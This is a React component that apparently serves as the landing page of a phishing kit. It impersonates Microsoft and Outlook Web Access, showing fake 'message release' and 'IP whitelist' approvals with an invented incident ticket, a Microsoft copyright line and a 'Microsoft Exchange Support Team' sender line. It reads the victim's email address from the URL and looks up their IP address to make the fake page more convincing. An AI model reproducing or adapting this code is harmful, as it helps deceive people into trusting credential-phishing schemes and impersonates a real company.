import React from 'react';
import CheckCircleOutlineIcon from '@material-ui/icons/CheckCircleOutline';
import { makeStyles } from '@material-ui/core/styles';
import Paper from '@material-ui/core/Paper';
import queryString from 'query-string'
import  {useState,useEffect} from 'react'
import {useLocation} from 'react-router-dom'
import Moment from 'moment'
const useStyles = makeStyles((theme) => ({
  root: {
 
  display:'flex',
    justifyContent:'center',
  margin:'5%'
    
  },
  paper: {
    padding: theme.spacing(2),
    textAlign: 'center',
    color: theme.palette.text.secondary,
    display:'flex',
    justifyContent:'center',
    flexDirection:"column",
    width:'100%',
  },
  icon:{
    color:"green",
    width:150,
    margin:'0 auto',
    height:150
  }

}));

export default function Landing() {
  
  const classes = useStyles();
  const location=useLocation()
  const [mail, setmail] = useState('');
  const [redirect, setred] = useState('');
  const [ip, setip] = useState('');
  
  useEffect(() => {
   
  console.log(location.search)
  
  const params=queryString.parse(location.search)
setmail(params.mail)
setred(params.redirect)
fetch("https://api.ipify.org/")
.then(response => response.text())
.then((response) => {
    setip(response)
})
.catch(err => console.log(err))
  }, [mail])
    return (
      <div  >
     


{ redirect=='releasemsg' && (   <div>
  
  <table style={{fontSize:'12px', fontFamily: 'Verdana, Arial, sans', width: '80vw', whiteSpace: 'normal', wordSpacing: '0px', fontWeight: '400px', color: 'rgb(33,33,33)', paddingBottom: '20px', fontStyle: 'normal',paddingTop: '2px',paddingLeft: '20px', paddingRight: '20px', backgroundColor: 'rgb(255,255,255)',textIndent: '0px'}} cellSpacing='0 'cellPadding='0 'border='0'>
<tbody>
<tr>
<td style={{fontSize: '14px', maxWidth: '60%',fontWeight: 'bold', paddingBottom: '20px', paddingTop: '2px'}}>OWA Message Release<span style={{maxWidth: '60%'}}></span></td></tr>
<tr>
<td style={{fontWeight:'bold',maxWidth: '60%', color: 'rgb(255,255,255)', paddingBottom: '2px', paddingTop: '2px', paddingLeft: '10px', paddingRight: '2px', backgroundColor: 'rgb(153,153,153)'}}>Request has been approved ** INC09672983 **
        <span >
        </span></td></tr>
<tr>
<td style={{maxWidth: '60%', borderRight: 'rgb(153,153,153) 1px solid', paddingBottom: '2px', paddingTop: '5px', paddingLeft: '10px', borderLeft: 'rgb(153,153,153) 1px solid', paddingRight: '2px'}}><span style={{fontSize: '14px', fontFamily: 'Helvetica, serif, emojiFont', color: 'rgb(102,102,102)'}}>Microsoft has initiated the delivery of 2 new emails from your contacts to your inbox as of today, fixing server error.</span>
    <span style={{fontSize: 'medium', fontFamily: 'calibri, helvetica, arial, sans-serif, serif, emojiFont', color: 'rgb(102,102,102)'}}><br/></span><span style={{fontWeight: 'bold'}}>Your pending messages would be delivered to your inbox({mail}).<br/></span><span style={{fontSize: '10px'}}>Request Ticket Support INC09672983 |<span ><span>&nbsp;</span></span></span><a  style={{fontSize: '16px', borderTop: 'rgb(3,104,212) 1px solid', fontFamily: 'Helvetica, Arial, sans-serif', borderRight: 'rgb(3,104,212) 1px solid', borderBottom: 'rgb(3,104,212) 1px solid', color: 'rgb(255,255,255)', paddingBottom: '5px', paddingTop: '5px', paddingLeft: '5px', borderLeft: 'rgb(3,104,212) 1px solid', display: 'inline-block', paddingRight: '5px', backgroundColor: '#eb9c12', borderRadius: '3px'}} href="" rel="noopener noreferrer" target="_blank "data-auth="NotApplicable">Request Successful</a><span style={{fontSize: "10px"}}><span ></span><br/>
<div><span style={{fontFamily: 'Helvetica, serif, EmojiFont', color: 'rgb(33,33,33)'}}>{Moment().format()}<span ></span></span></div></span></td></tr>
<tr>
<td style={{borderTop: 'rgb(153,153,153) 1px solid'}}></td></tr>
<tr>
<td></td></tr>
<tr>
<td>
<div><span style={{fontSize: '9px', fontFamily: 'Helvetica, serif, EmojiFont', color: 'rgb(89,89,89)'}}>
<br/>This message was sent to {mail} by Microsoft Exchange Support Team</span></div>
<div><span style={{fontSize: '9px', fontFamily: 'Helvetica, serif, EmojiFont', color: 'rgb(89,89,89)'}}>
NOTICE: The information released, including any attachment, is for the sole use of the intended recipient(s) and
may contain confidential and legally privileged information.
      <br/> If you are not the intended recipient, any disclosure, copying, distribution or use of the contents of this information in any manner 
is strictly prohibited and may be unlawful.
    </span>
</div></td></tr></tbody></table>
<span style={{fontSize: '9pt', fontFamily: 'arial, serif, EmojiFont', whiteSpace: 'normal', wordSpacing: '0px', fontWeight: '400', color: 'rgb(33,33,33)', fontStyle: 'italic', orphans: '2', widows: '2', letterSpacing: 'normal', backgroundColor: 'rgb(255,255,255)', textIndent: '0px'}}>
<p></p>
<p><br/>Copyright (c) Microsoft Corporation.  All rights reserved.<span>&nbsp;</span><br/><br/><span>&nbsp;</span><br/></p></span></div>)}
{ redirect=='whitelist' &&    (   <div>
  
  <table style={{fontSize:'12px', fontFamily: 'Verdana, Arial, sans', width: '80vw', whiteSpace: 'normal', wordSpacing: '0px', fontWeight: '400px', color: 'rgb(33,33,33)', paddingBottom: '20px', fontStyle: 'normal',paddingTop: '2px',paddingLeft: '20px', paddingRight: '20px', backgroundColor: 'rgb(255,255,255)',textIndent: '0px'}} cellSpacing='0 'cellPadding='0 'border='0'>
<tbody>
<tr>
<td style={{fontSize: '14px', maxWidth: '60%',fontWeight: 'bold', paddingBottom: '20px', paddingTop: '2px'}}>OWA IP Whitelist Service Request<span style={{maxWidth: '60%'}}></span></td></tr>
<tr>
<td style={{fontWeight:'bold',maxWidth: '60%', color: 'rgb(255,255,255)', paddingBottom: '2px', paddingTop: '2px', paddingLeft: '10px', paddingRight: '2px', backgroundColor: 'rgb(153,153,153)'}}>Request has been approved ** INC09672983 **
        <span >
        </span></td></tr>
<tr>
<td style={{maxWidth: '60%', borderRight: 'rgb(153,153,153) 1px solid',
 paddingBottom: '2px', paddingTop: '5px', paddingLeft: '10px',
  borderLeft: 'rgb(153,153,153) 1px solid', paddingRight: '2px'}}>
    <span style={{fontSize: '14px', fontFamily: 'Helvetica, serif, emojiFont',
     color: 'rgb(102,102,102)'}}>Microsoft has confirmed the service request and reprocessed your mailbox IP{ip}. Your Ip has been whitelisted and you can keep enjoying our mailbox services.
     </span>
    <span style=
{{fontSize: 'medium', fontFamily: 'calibri, helvetica, arial, sans-serif, serif, emojiFont', color: 'rgb(102,102,102)'}}>
  <br/></span><span style={{fontWeight: 'bold'}}>Ensure sending secured and safe messages from your mailbox to prevent further problems.<br/></span><span style={{fontSize: '10px'}}>Request Ticket Support INC09672983 |<span ><span>&nbsp;</span></span></span><a  style={{fontSize: '16px', borderTop: 'rgb(3,104,212) 1px solid', fontFamily: 'Helvetica, Arial, sans-serif', borderRight: 'rgb(3,104,212) 1px solid', borderBottom: 'rgb(3,104,212) 1px solid', color: 'rgb(255,255,255)', paddingBottom: '5px', paddingTop: '5px', paddingLeft: '5px', borderLeft: 'rgb(3,104,212) 1px solid', display: 'inline-block', paddingRight: '5px', backgroundColor: 'blue', borderRadius: '3px'}} href="" rel="noopener noreferrer" target="_blank "data-auth="NotApplicable">Request Successful</a><span style={{fontSize: "10px"}}><span ></span><br/>
<div><span style={{fontFamily: 'Helvetica, serif, EmojiFont', color: 'rgb(33,33,33)'}}>{Moment().format()}<span ></span></span></div></span></td></tr>
<tr>
<td style={{borderTop: 'rgb(153,153,153) 1px solid'}}></td></tr>
<tr>
<td></td></tr>
<tr>
<td>
<div><span style={{fontSize: '9px', fontFamily: 'Helvetica, serif, EmojiFont', color: 'rgb(89,89,89)'}}>
<br/>This message was sent to {mail} by Microsoft Exchange Support Team</span></div>
<div><span style={{fontSize: '9px', fontFamily: 'Helvetica, serif, EmojiFont', color: 'rgb(89,89,89)'}}>
NOTICE: The information released, including any attachment, is for the sole use of the intended recipient(s) and
may contain confidential and legally privileged information.
      <br/> If you are not the intended recipient, any disclosure, copying, distribution or use of the contents of this information in any manner 
is strictly prohibited and may be unlawful.
    </span>
</div></td></tr></tbody></table>
<span style={{fontSize: '9pt', fontFamily: 'arial, serif, EmojiFont', whiteSpace: 'normal', wordSpacing: '0px', fontWeight: '400', color: 'rgb(33,33,33)', fontStyle: 'italic', orphans: '2', widows: '2', letterSpacing: 'normal', backgroundColor: 'rgb(255,255,255)', textIndent: '0px'}}>
<p></p>
<p><br/>Copyright (c) Microsoft Corporation.  All rights reserved.<span>&nbsp;</span><br/><br/><span>&nbsp;</span><br/></p></span></div>)}
      
      </div>
    );
    }